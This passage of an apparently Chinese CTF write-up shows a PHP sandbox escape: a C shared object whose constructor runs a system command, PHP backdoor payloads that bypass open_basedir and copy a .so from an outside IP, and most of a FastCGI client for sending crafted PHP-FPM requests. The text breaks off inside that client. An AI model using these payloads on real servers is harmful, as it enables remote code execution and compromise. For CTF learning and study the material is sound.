class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__attribute__</span> ((__constructor__)) <span class="keyword">void</span> <span class="title function_ invoke__">preload</span> (<span class="keyword">void</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag &gt; /tmp/flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc xxx.c -fPIC -shared -o ext.so</span><br></pre></td></tr></table></figure><p>写入 tmp 目录，别人用的是远程获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">/add_api.php?backdoor=mkdir(<span class="string">&#x27;w0s1np&#x27;</span>);chdir(<span class="string">&#x27;w0s1np&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);copy(<span class="string">&#x27;http://47.110.124.239/test/hpdoger.so&#x27;</span>,<span class="string">&#x27;/tmp/hpdoger.so&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>👴就不一样，既然 file_put_contents 能用，为啥不直接写进去.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&#x27;/tmp/ext.so&#x27;</span>,base64_decode(<span class="string">&#x27;&#x27;</span>));</span><br></pre></td></tr></table></figure><p>测，打不出来，还得是 copy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;wcsndm&#x27;</span>);chdir(<span class="string">&#x27;wcsndm&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);copy(<span class="string">&#x27;ip/file&#x27;</span>,<span class="string">&#x27;/tmp/ext.so&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;wcsndm&#x27;</span>);chdir(<span class="string">&#x27;wcsndm&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);$a = new FilesystemIterator(<span class="string">&quot;glob:///tmp/*&quot;</span>);foreach($a <span class="keyword">as</span> $f)&#123;echo($f-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure><p>检测是否上传成功</p><h2 id="生成-fpm-恶意数据"><span id="生成-fpm-恶意数据"> 生成 fpm 恶意数据</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Note : Code <span class="keyword">is</span> released under the GNU LGPL</span><br><span class="line"> *</span><br><span class="line"> * Please do <span class="keyword">not</span> change the header of this file</span><br><span class="line"> *</span><br><span class="line"> * This library <span class="keyword">is</span> free software; you can redistribute it <span class="keyword">and</span>/<span class="keyword">or</span> modify it under the terms of the GNU</span><br><span class="line"> * Lesser General Public License <span class="keyword">as</span> published by the Free Software Foundation; either version <span class="number">2</span> of</span><br><span class="line"> * the License, <span class="keyword">or</span> (at your option) <span class="built_in">any</span> later version.</span><br><span class="line"> *</span><br><span class="line"> * This library <span class="keyword">is</span> distributed <span class="keyword">in</span> the hope that it will be useful, but WITHOUT ANY WARRANTY;</span><br><span class="line"> * without even the implied warranty of MERCHANTABILITY <span class="keyword">or</span> FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line"> *</span><br><span class="line"> * See the GNU Lesser General Public License <span class="keyword">for</span> more details.</span><br><span class="line"> */</span><br><span class="line">/**</span><br><span class="line"> * Handles communication <span class="keyword">with</span> a FastCGI application</span><br><span class="line"> *</span><br><span class="line"> * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;</span><br><span class="line"> * @version     <span class="number">1.0</span></span><br><span class="line"> */</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FCGIClient</span></span><br><span class="line">&#123;</span><br><span class="line">    const VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    const BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    const ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    const END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    const PARAMS               = <span class="number">4</span>;</span><br><span class="line">    const STDIN                = <span class="number">5</span>;</span><br><span class="line">    const STDOUT               = <span class="number">6</span>;</span><br><span class="line">    const STDERR               = <span class="number">7</span>;</span><br><span class="line">    const DATA                 = <span class="number">8</span>;</span><br><span class="line">    const GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    const GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    const UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    const MAXTYPE              = self::UNKNOWN_TYPE;</span><br><span class="line">    const RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    const AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    const FILTER               = <span class="number">3</span>;</span><br><span class="line">    const REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    const CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    const OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    const UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    const MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    const MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    const MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    const HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    /**</span><br><span class="line">     * Socket</span><br><span class="line">     * @var Resource</span><br><span class="line">     */</span><br><span class="line">    private $_sock = null;</span><br><span class="line">    /**</span><br><span class="line">     * Host</span><br><span class="line">     * @var String</span><br><span class="line">     */</span><br><span class="line">    private $_host = null;</span><br><span class="line">    /**</span><br><span class="line">     * Port</span><br><span class="line">     * @var Integer</span><br><span class="line">     */</span><br><span class="line">    private $_port = null;</span><br><span class="line">    /**</span><br><span class="line">     * Keep Alive</span><br><span class="line">     * @var Boolean</span><br><span class="line">     */</span><br><span class="line">    private $_keepAlive = false;</span><br><span class="line">    /**</span><br><span class="line">     * Constructor</span><br><span class="line">     *</span><br><span class="line">     * @param String $host Host of the FastCGI application</span><br><span class="line">     * @param Integer $port Port of the FastCGI application</span><br><span class="line">     */</span><br><span class="line">    public function __construct($host, $port = <span class="number">9001</span>) // <span class="keyword">and</span> default value <span class="keyword">for</span> port, just <span class="keyword">for</span> unixdomain socket</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_host = $host;</span><br><span class="line">        $this-&gt;_port = $port;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Define whether <span class="keyword">or</span> <span class="keyword">not</span> the FastCGI application should keep the connection</span><br><span class="line">     * alive at the end of a request</span><br><span class="line">     *</span><br><span class="line">     * @param Boolean $b true <span class="keyword">if</span> the connection should stay alive, false otherwise</span><br><span class="line">     */</span><br><span class="line">    public function setKeepAlive($b)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_keepAlive = (boolean)$b;</span><br><span class="line">        <span class="keyword">if</span> (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123;</span><br><span class="line">            fclose($this-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Get the keep alive status</span><br><span class="line">     *</span><br><span class="line">     * @<span class="keyword">return</span> Boolean true <span class="keyword">if</span> the connection should stay alive, false otherwise</span><br><span class="line">     */</span><br><span class="line">    public function getKeepAlive()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Create a connection to the FastCGI application</span><br><span class="line">     */</span><br><span class="line">    private function connect()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$this-&gt;_sock) &#123;</span><br><span class="line">            //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, <span class="number">5</span>);</span><br><span class="line">            $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!$this-&gt;_sock) &#123;</span><br><span class="line">                throw new Exception(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Build a FastCGI packet</span><br><span class="line">     *</span><br><span class="line">     * @param Integer $<span class="built_in">type</span> <span class="type">Type</span> of the packet</span><br><span class="line">     * @param String $content Content of the packet</span><br><span class="line">     * @param Integer $requestId RequestId</span><br><span class="line">     */</span><br><span class="line">    private function buildPacket($<span class="built_in">type</span>, $content, $requestId = <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $clen = strlen($content);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(self::VERSION_1)         /* version */</span><br><span class="line">            . <span class="built_in">chr</span>($<span class="built_in">type</span>)                    /* <span class="built_in">type</span> */</span><br><span class="line">            . <span class="built_in">chr</span>(($requestId &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) /* requestIdB1 */</span><br><span class="line">            . <span class="built_in">chr</span>($requestId &amp; <span class="number">0xFF</span>)        /* requestIdB0 */</span><br><span class="line">            . <span class="built_in">chr</span>(($clen &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     /* contentLengthB1 */</span><br><span class="line">            . <span class="built_in">chr</span>($clen &amp; <span class="number">0xFF</span>)             /* contentLengthB0 */</span><br><span class="line">            . <span class="built_in">chr</span>(<span class="number">0</span>)                        /* paddingLength */</span><br><span class="line">            . <span class="built_in">chr</span>(<span class="number">0</span>)                        /* reserved */</span><br><span class="line">            . $content;                     /* content */</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Build an FastCGI Name value pair</span><br><span class="line">     *</span><br><span class="line">     * @param String $name Name</span><br><span class="line">     * @param String $value Value</span><br><span class="line">     * @<span class="keyword">return</span> String FastCGI Name value pair</span><br><span class="line">     */</span><br><span class="line">    private function buildNvpair($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $nlen = strlen($name);</span><br><span class="line">        $vlen = strlen($value);</span><br><span class="line">        <span class="keyword">if</span> ($nlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            /* nameLengthB0 */</span><br><span class="line">            $nvpair = <span class="built_in">chr</span>($nlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br><span class="line">            $nvpair = <span class="built_in">chr</span>(($nlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="built_in">chr</span>(($nlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="built_in">chr</span>(($nlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="built_in">chr</span>($nlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($vlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            /* valueLengthB0 */</span><br><span class="line">            $nvpair .= <span class="built_in">chr</span>($vlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br><span class="line">            $nvpair .= <span class="built_in">chr</span>(($vlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="built_in">chr</span>(($vlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="built_in">chr</span>(($vlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="built_in">chr</span>($vlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        /* nameData &amp; valueData */</span><br><span class="line">        <span class="keyword">return</span> $nvpair . $name . $value;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Read a <span class="built_in">set</span> of FastCGI Name value pairs</span><br><span class="line">     *</span><br><span class="line">     * @param String $data Data containing the <span class="built_in">set</span> of FastCGI NVPair</span><br><span class="line">     * @<span class="keyword">return</span> array of NVPair</span><br><span class="line">     */</span><br><span class="line">    private function readNvpair($data, $length = null)</span><br><span class="line">    &#123;</span><br><span class="line">        $array = array();</span><br><span class="line">        <span class="keyword">if</span> ($length === null) &#123;</span><br><span class="line">            $length = strlen($data);</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($p != $length) &#123;</span><br><span class="line">            $nlen = <span class="built_in">ord</span>($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($nlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $nlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $nlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $nlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $nlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $vlen = <span class="built_in">ord</span>($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($vlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $vlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $vlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $vlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $vlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span><br><span class="line">            $p += ($nlen + $vlen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $array;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Decode a FastCGI Packet</span><br><span class="line">     *</span><br><span class="line">     * @param String $data String containing <span class="built_in">all</span> the packet</span><br><span class="line">     * @<span class="keyword">return</span> array</span><br><span class="line">     */</span><br><span class="line">    private function decodePacketHeader($data)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = array();</span><br><span class="line">        $ret[<span class="string">&#x27;version&#x27;</span>]       = <span class="built_in">ord</span>($data&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;type&#x27;</span>]          = <span class="built_in">ord</span>($data&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;requestId&#x27;</span>]     = (<span class="built_in">ord</span>($data&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="built_in">ord</span>($data&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;contentLength&#x27;</span>] = (<span class="built_in">ord</span>($data&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="built_in">ord</span>($data&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;paddingLength&#x27;</span>] = <span class="built_in">ord</span>($data&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;reserved&#x27;</span>]      = <span class="built_in">ord</span>($data&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Read a FastCGI Packet</span><br><span class="line">     *</span><br><span class="line">     * @<span class="keyword">return</span> array</span><br><span class="line">     */</span><br><span class="line">    private function readPacket()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123;</span><br><span class="line">            $resp = $this-&gt;decodePacketHeader($packet);</span><br><span class="line">            $resp[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                $<span class="built_in">len</span>  = $resp[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> ($<span class="built_in">len</span> &amp;&amp; $buf=fread($this-&gt;_sock, $<span class="built_in">len</span>)) &#123;</span><br><span class="line">                    $<span class="built_in">len</span> -= strlen($buf);</span><br><span class="line">                    $resp[<span class="string">&#x27;content&#x27;</span>] .= $buf;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                $buf=fread($this-&gt;_sock, $resp[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $resp;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Get Informations on the FastCGI application</span><br><span class="line">     *</span><br><span class="line">     * @param array $requestedInfo information to retrieve</span><br><span class="line">     * @<span class="keyword">return</span> array</span><br><span class="line">     */</span><br><span class="line">    public function getValues(array $requestedInfo)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">        $request = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        foreach ($requestedInfo <span class="keyword">as</span> $info) &#123;</span><br><span class="line">            $request .= $this-&gt;buildNvpair($info, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, <span class="number">0</span>));</span><br><span class="line">        $resp = $this-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> ($resp[<span class="string">&#x27;type&#x27;</span>] == self::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> $this-&gt;readNvpair($resp[<span class="string">&#x27;content&#x27;</span>], $resp[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            throw new Exception(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Execute a request to the FastCGI application</span><br><span class="line">     *</span><br><span class="line">     * @param array $params Array of parameters</span><br><span class="line">     * @param String $stdin Content</span><br><span class="line">     * @<span class="keyword">return</span> String</span><br><span class="line">     */</span><br><span class="line">    public function request(array $params, $stdin)</span><br><span class="line">    &#123;</span><br><span class="line">        $response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">//        $this-&gt;connect();</span><br><span class="line">        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, <span class="built_in">chr</span>(<span class="number">0</span>) . <span class="built_in">chr</span>(self::RESPONDER) . <span class="built_in">chr</span>((<span class="built_in">int</span>) $this-&gt;_keepAlive) . str_repeat(<span class="built_in">chr</span>(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        $paramsRequest = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        foreach ($params <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            $paramsRequest .= $this-&gt;buildNvpair($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($paramsRequest) &#123;</span><br><span class="line">            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= $this-&gt;buildPacket(self::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($stdin) &#123;</span><br><span class="line">            $request .= 